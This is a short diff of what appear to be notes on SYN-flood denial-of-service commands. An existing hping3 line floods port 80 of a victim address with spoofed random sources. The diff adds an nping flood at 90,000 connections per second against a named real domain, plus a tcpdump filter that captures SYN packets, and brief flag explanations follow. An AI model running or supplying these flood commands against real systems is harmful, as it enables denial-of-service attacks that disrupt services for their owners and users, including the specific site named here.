@@ -1,5 +1,9 @@
 hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source IP_victim
 
+nping --tcp-connect -rate=90000 -c 900000 -q www.redlibre.cl
+
+tcpdump "tcp[tcpflags] & (tcp-syn) != 0"
+
 
     -c 100000 = Number of packets to send.
     -d 120 = Size of each packet that was sent to target machine.
